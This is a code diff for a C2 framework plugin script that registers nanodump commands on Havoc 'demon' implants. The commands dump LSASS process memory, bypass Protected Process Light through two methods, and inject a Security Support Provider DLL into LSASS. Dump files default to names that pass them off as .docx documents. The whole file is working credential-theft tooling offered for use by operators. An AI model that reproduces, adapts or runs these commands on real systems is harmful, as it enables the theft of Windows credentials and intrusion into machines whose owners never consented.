@@ -367,7 +367,7 @@ def nanodump(demonID, *params):
 
     return TaskID
 
-def nanodump_ppl(demonID, *params):
+def nanodump_ppl_dump(demonID, *params):
     TaskID : str    = None
     demon  : Demon  = None
     packer = NNDPacker()
@@ -380,7 +380,7 @@ def nanodump_ppl(demonID, *params):
 
     demon = Demon( demonID )
 
-    with open('bin/nanodump_ppl.x64.dll', 'rb') as f:
+    with open('bin/nanodump_ppl_dump.x64.dll', 'rb') as f:
         dll = f.read()
     if len(dll) == 0:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
@@ -407,7 +407,7 @@ def nanodump_ppl(demonID, *params):
             # set arg to true for handle duplication
             dup = True
         elif param == "--help" or param == "-h":
-            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl_dump --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
             demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
@@ -437,36 +437,188 @@ def nanodump_ppl(demonID, *params):
     packer.addbool(dup)
     packer.addbytes(dll)
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl BOF" )
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl_dump BOF" )
 
-    demon.InlineExecute( TaskID, "go", "bin/nanodump_ppl.x64.o", packer.getbuffer(), False )
+    demon.InlineExecute( TaskID, "go", "bin/nanodump_ppl_dump.x64.o", packer.getbuffer(), False )
 
     return TaskID
 
-def load_ssp(demonID, *params):
+def nanodump_ppl_medic(demonID, *params):
     TaskID : str    = None
     demon  : Demon  = None
     packer = NNDPacker()
 
     num_params = len(params)
-    ssp_path = ''
+    use_valid_sig = False
+    write_file = False
+    dump_path = ''
+    elevate_handle = False
 
     demon = Demon( demonID )
 
-    if num_params != 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing the SSP path" )
+    with open('bin/nanodump_ppl_medic.x64.dll', 'rb') as f:
+        dll = f.read()
+    if len(dll) == 0:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
         return True
 
-    ssp_path = params[ 0 ] 
+    skip = False
+    for i in range(num_params):
+        if skip:
+            skip = False
+            continue
+        param = params[i]
+        if param == '--valid' or param == '-v':
+            # use a valid signature for the minidump
+            use_valid_sig = True
+        elif param == '--write' or param == '-w':
+            # set the path where the minidump will be written to disk
+            write_file = True
+            skip = True
+            if i + 1 >= num_params:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
+                return True
+            dump_path = params[i + 1]
+        elif param == '--elevate-handle' or param == '-d':
+            # set arg to true for handle elevation
+            elevate_handle = True
+        elif param == "--help" or param == "-h":
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl_medic --write C:\\Windows\\Temp\\doc.docx [--valid] [--elevate-handle] [--help]" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid opening a handle with high privileges:")
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --elevate-handle, -eh" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS with low privileges and duplicate it to gain higher privileges" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
+            return True
+        else:
+            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
+            return True
 
-    packer.addstr(ssp_path)
+    if write_file is False:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
+        return True
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute load_ssp BOF" )
+    if is_full_path(dump_path) is False:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
+        return True
 
-    demon.InlineExecute( TaskID, "go", "bin/load_ssp.x64.o", packer.getbuffer(), False )
+    packer.addbytes(dll)
+    packer.addstr(dump_path)
+    packer.addbool(use_valid_sig)
+    packer.addbool(elevate_handle)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl_medic BOF" )
+
+    demon.InlineExecute( TaskID, "go", "bin/nanodump_ppl_medic.x64.o", packer.getbuffer(), False )
+
+    return TaskID
+
+def nanodump_ssp(demonID, *params):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = NNDPacker()
+
+    num_params = len(params)
+    nanodump_ssp_dll = b''
+    write_dll_path = ''
+    load_path = ''
+    dump_path = ''
+    use_valid_sig = False
+    write_file = False
+
+    demon = Demon( demonID )
+
+    skip = False
+    for i in range(num_params):
+        if skip:
+            skip = False
+            continue
+        param = params[i]
+        if param == '--valid' or param == '-v':
+            # use a valid signature for the minidump
+            use_valid_sig = True
+        elif param == '--write' or param == '-w':
+            # set the path where the minidump will be written to disk
+            write_file = True
+            skip = True
+            if i + 1 >= num_params:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
+                return True
+            dump_path = params[i + 1]
+        elif param == '--write-dll' or param == '-wdll':
+            skip = True
+            if i + 1 >= num_params:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write-dll value" )
+                return True
+            write_dll_path = params[i + 1]
+        elif param == '--load-dll' or param == '-ldll':
+            skip = True
+            if i + 1 >= num_params:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --load-dll value" )
+                return True
+            load_path = params[i + 1]
+        elif param == "--help" or param == "-h":
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ssp --write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "SSP DLL options:" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write-dll, -wdll" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            path where to write the SSP DLL from nanodump (randomly generated if not defined)" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --load-dll, -ldll" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            load an existing SSP DLL" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
+            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
+            return True
+        else:
+            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
+            return True
+
+    if write_file is False:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
+        return True
+
+    if is_full_path(dump_path) is False:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
+        return True
+
+    if load_path != '' and write_dll_path != '':
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"The options --write-dll and --load-dll cannot be used together" )
+        return True
+
+    if load_path != '' and is_full_path(load_path) is False:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {load_path}" )
+        return True
+
+    if load_path == '':
+        with open('bin/nanodump_ssp.x64.dll', 'rb') as f:
+            nanodump_ssp_dll = f.read()
+        if len(nanodump_ssp_dll) == 0:
+            demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
+            return True
+
+    packer.addbytes(nanodump_ssp_dll)
+    packer.addstr(write_dll_path)
+    packer.addstr(load_path)
+    packer.addstr(dump_path)
+    packer.addbool(use_valid_sig)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ssp BOF" )
+
+    demon.InlineExecute( TaskID, "go", "bin/nanodump_ssp.x64.o", packer.getbuffer(), False )
 
     return TaskID
 
 RegisterCommand( nanodump, "", "nanodump", "Dump the LSASS process", 0, "[--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", "-w c:\\windows\\Temp\\test.txt" )
-RegisterCommand( nanodump_ppl, "", "nanodump_ppl", "Bypass PPL and dump LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", "-w c:\\windows\\Temp\\test.txt" )
-RegisterCommand( load_ssp, "", "load_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "load_ssp <SSP path>", "load_ssp C:\\Windows\\Temp\\nanodump_ssp.x64.dll" )
+RegisterCommand( nanodump_ppl_dump, "", "nanodump_ppl_dump", "Bypass PPL and dump LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", "-w c:\\windows\\Temp\\test.txt" )
+RegisterCommand( nanodump_ppl_medic, "", "nanodump_ppl_medic", "Bypass PPL and dump LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--elevate-handle] [--help]", "-w c:\\windows\\Temp\\test.txt" )
+RegisterCommand( nanodump_ssp, "", "nanodump_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", "-w C:\\Windows\\Temp\\test.txt" )
